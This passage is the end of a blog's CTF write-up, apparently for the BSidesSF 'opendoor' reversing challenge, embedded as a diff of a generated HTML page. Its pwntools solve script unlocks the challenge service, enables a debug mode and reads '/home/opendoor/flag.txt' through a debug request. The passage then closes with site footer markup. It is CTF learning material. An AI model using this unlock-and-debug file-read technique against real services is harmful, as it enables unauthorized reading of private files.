+                size = u32(msg[<span style="color:#3677a9">12</span>:<span style="color:#3677a9">16</span>], endian=<span style="color:#ed9d13">&#39;big&#39;</span>)
+                text = msg[<span style="color:#3677a9">16</span>:<span style="color:#3677a9">16</span>+size]
+                <span style="color:#6ab825;font-weight:bold">print</span> <span style="color:#ed9d13">&#34;[ Debug ] - [ text : &#39;</span><span style="color:#ed9d13">%s</span><span style="color:#ed9d13">&#39; ]&#34;</span> % text
+
+
+    r = remote(<span style="color:#ed9d13">&#39;opendoor-ea62dae9.challenges.bsidessf.net&#39;</span>, <span style="color:#3677a9">4141</span>)
+
+    <span style="color:#999;font-style:italic"># unlock request to set unlock flag</span>
+    <span style="color:#999;font-style:italic"># send debug request with debug flag on to debug</span>
+    <span style="color:#999;font-style:italic"># send debug request to read any file</span>
+
+    r.send(msg(<span style="color:#3677a9">3</span>, unlockReq()))
+    parse(r.recv())
+    r.send(msg(<span style="color:#3677a9">5</span>, debugReq1(<span style="color:#3677a9">1</span>)))
+    parse(r.recv())
+    r.send(msg(<span style="color:#3677a9">5</span>, debugReq2(<span style="color:#ed9d13">&#39;/home/opendoor/flag.txt&#39;</span>)))
+    parse(r.recv())
+    r.close()
+</code></pre></div><p>And the Output &hellip;</p>
+<p><img src="/images/bsides/output.png" alt="output"  /></p>
+<pre><code>Solved after the CTF was over :(
+</code></pre>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/reversing/">reversing</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+    integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
+    integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4"
+    crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+    integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+    onload="renderMathInElement(document.querySelector(`.article-content`));"></script>
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/post/hacklu-2018-forgetful-commander/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackLu 2018 - Forgetful Commander</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/inctf-2018-decoy/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">InCTF 2018 - Decoy</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/inctf-2018-ultimate-goal/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">InCTF 2018 - Ultimate GOal</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/inctf-2018-mast3r/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">InCTF 2018 - mast3r</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/inctf-confuse-me/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">INCTF - Confuse Me</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">&copy; 2020 x0r19x91&#39;s blog</section>
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="1.1.0">Stack</a></b> designed by
+        <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true" style="display:none">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+            </main>
+        </div>
+        <script src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"
+    integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin="anonymous"></script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<link rel="stylesheet" href="/css/highlight/light.min.css" media="(prefers-color-scheme: light)">
+<link rel="stylesheet" href="/css/highlight/dark.min.css" media="(prefers-color-scheme: dark)">
+
+    </body>
+</html>
